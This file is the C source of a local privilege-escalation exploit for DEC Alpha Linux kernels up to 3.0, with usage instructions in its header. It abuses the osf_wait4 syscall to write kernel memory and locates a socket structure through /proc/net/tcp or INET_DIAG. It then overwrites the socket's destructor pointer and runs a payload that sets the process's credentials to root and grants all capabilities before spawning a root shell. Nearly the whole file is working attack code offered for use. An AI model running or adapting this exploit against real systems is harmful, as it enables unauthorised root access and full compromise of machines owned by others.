/*
 * DEC Alpha Linux <= 3.0 local root exploit
 * by Dan Rosenberg (@djrbliss)
 *
 * Usage:
 * $ gcc alpha-omega.c -o alpha-omega
 * $ ./alpha-omega
 *
 * Notes:
 * -Payload specific to <= 2.6.28 (no cred struct, modify as needed)
 * -Socket trigger tested on 2.6.28 (adjust offset as needed)
 * -INET_DIAG parsing code borrowed from netstat
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>
#include <netinet/in.h>

#define SYS_osf_wait4 7
#define SOCK_OFFSET 552			/* Offset of sk_destruct fptr in sock
					 * struct, change for your kernel */
#define PAGE_SIZE 8192			/* DEC alpha page size is 8K */
#define KERNEL_BASE 0xfffffc0000000000	/* DEC alpha PAGE_OFFSET */ 
#define TASK_STRUCT_OFFSET 64		/* task_struct offset in thread_info */
#define PAYLOAD 0x20000
#define PORT 31337

static int uid, gid;

/* Writes (0xff & value) << 8 to addr */
void kernel_write(unsigned long addr, int value)
{
	int pid = fork();

	if (pid) {
		/* wait4 backdoor number two? ;) */
		syscall(SYS_osf_wait4, pid, (int *)addr, 0, 1);
		return;
	} else {
		exit(value);
	}
}

/* Get the INET_DIAG cookie for our socket, which contains the low 32 bits
 * of the sock struct address */
unsigned int get_cookie(unsigned int port)
{
	int fd;
	struct sockaddr_nl nladdr;
	struct {
		struct nlmsghdr nlh;
		struct inet_diag_req r;
	} req;
	struct msghdr msg;
	char buf[8192];
	struct iovec iov;
	struct inet_diag_msg *r;

	if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG)) < 0)
		return -1;
	
	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	
	req.nlh.nlmsg_len = sizeof(req);
	req.nlh.nlmsg_type = TCPDIAG_GETSOCK;
	req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
	req.nlh.nlmsg_pid = 0;
	req.nlh.nlmsg_seq = 123456;
	memset(&req.r, 0, sizeof(req.r));
	req.r.idiag_family = AF_INET;
	req.r.idiag_states = 0xfff;
	req.r.idiag_ext = 0;

	iov.iov_base = &req;
	iov.iov_len = sizeof(req);
	
	msg = (struct msghdr) {
		.msg_name = (void*)&nladdr,
		.msg_namelen = sizeof(nladdr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	
	if (sendmsg(fd, &msg, 0) < 0) {
		close(fd);
		return -1;	
	}
	
	iov.iov_base = buf;
	iov.iov_len = sizeof(buf);
	
	while (1) {
		int status;
		struct nlmsghdr *h;
			
		msg = (struct msghdr) {
			(void*)&nladdr, sizeof(nladdr),
			&iov, 1, NULL, 0, 0
		};
			
		status = recvmsg(fd, &msg, 0);
			
		if (status < 0) {
			if (errno == EINTR)
				continue;
			close(fd);
			return -1;
		}
			
		if (status == 0) {
			close(fd);
			return -1;
		}
		
		h = (struct nlmsghdr*)buf;
		while (NLMSG_OK(h, status)) {
			if (h->nlmsg_seq == 123456) {
				if (h->nlmsg_type == NLMSG_DONE) {
					close(fd);
					return -1;
				}
				
				if (h->nlmsg_type == NLMSG_ERROR) {
					close(fd);
					return -1;
				}
				
				r = NLMSG_DATA(h);
				if (r->idiag_family == AF_INET &&
				    ntohs(r->id.idiag_sport) == port)
					return r->id.idiag_cookie[0];
				
			}
			h = NLMSG_NEXT(h, status);
		}
	}
	close(fd);
	return -1;
}

/* Get the address of the sock struct for our socket */
unsigned long get_sock_addr(unsigned int port)
{
	FILE *f;
	char buf[1024], path[512];
	unsigned int testport, cookie, a;
	unsigned long addr, b;

	f = fopen("/proc/net/tcp", "r");

	if (f < 0) {
		printf("[*] Failed to open /proc/net/tcp\n");
		return 0;
	}

	while (fgets(buf, 1024, f)) {
		sscanf(buf, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X "
			    "%02X:%08lX %08X %5d %8d %lu %d %p %lu %lu %u %u "
			    "%d\n",
			    &a, &a, &testport, &a, &a, &a, &a, &a, &a, &b,
			    &a, &a, &a, &b, &a, (void **)&addr, &b, &b, &a, &a,
			    &a);
		if (testport == port) {
			/* If kptr_restrict is on... */
			if (!addr) {
				cookie = get_cookie(port);
				addr = (unsigned long)cookie + KERNEL_BASE;
			}
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}

void getroot()
{
	int i;
	/* Alpha has 16K stacks */
	unsigned long thread_info = (unsigned long)&i & ~0x3fff;
	unsigned long task_struct = *(unsigned long *)(thread_info +
							TASK_STRUCT_OFFSET);
	int *j = (int *)task_struct;

	for (i = 0; i < 1000; i++, j++) {

		if (j[0] == uid && j[1] == uid && j[2] == uid && j[3] == uid &&
		    j[4] == gid && j[5] == gid && j[6] == gid && j[7] == gid) {

			/* uid, euid, suid, fsuid */
			j[0] = j[1] = j[2] = j[3] = 0;

			/* gid, egid, sgid, fsgid */
			j[4] = j[5] = j[6] = j[7] = 0;

			/* caps */
			j[10] = j[11] = 0xffffffff;
			j[12] = j[13] = 0xffffffff;
			j[14] = j[15] = 0xffffffff;

			break;
		}
	}
}

void trampoline()
{

	asm volatile(	"mov %0, $0\n"
			"ldq $27, 0($0)\n"
			"jsr $26, ($27)\n"
			: : "r"(PAYLOAD));

}

int main(int argc, char * argv[])
{
	unsigned long target, *payload;
	void *landing;
	int sock;
	struct sockaddr_in addr;
	size_t len;

	uid = getuid();
	gid = getgid();

	printf("[*] Opening TCP socket...\n");
	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock < 0) {
		printf("[*] Failed to open TCP socket.\n");
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
		printf("[*] Failed to bind TCP socket.\n");
		return -1;
	}

	/* Our socket won't appear in /proc/net/tcp unless it's listening */
	if (listen(sock, 1)) {
		printf("[*] Failed to listen on TCP socket.\n");
		return -1;
	}

	printf("[*] Getting socket address from INET_DIAG...\n");
	target = get_sock_addr(PORT);

	if (!target) {
		printf("[*] Failed to get socket address.\n");
		return -1;
	}

	printf("[*] Socket address: %lx\n", target);

	target += SOCK_OFFSET;

	printf("[*] Mapping payload...\n");

	landing = mmap((void *)0x10000, PAGE_SIZE, PROT_READ | PROT_WRITE |
			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
			0, 0);

	/* We need to keep the address of our payload at a constant address,
	 * so we can retrieve it and jump to it in our trampoline. */
	payload = (unsigned long *)mmap((void *)PAYLOAD, PAGE_SIZE,
			PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE |
			MAP_ANONYMOUS | MAP_FIXED, 0, 0);

	if (landing == MAP_FAILED || payload == MAP_FAILED) {
		printf("[*] Failed to map payload.\n");
		return -1;
	}

	*payload = (unsigned long)&getroot;

	memcpy((void *)landing, &trampoline, 256);

	printf("[*] Overwriting function pointer at %lx...\n", target);
	kernel_write(target, 0);
	kernel_write(target + 4, 0);
	kernel_write(target + 1, 1);

	printf("[*] Triggering payload...\n");
	close(sock);

	if (getuid()) {
		printf("[*] Failed to get root.\n");
		return -1;
	}

	printf("[*] Got root!\n");
	execl("/bin/sh", "sh", NULL);
}

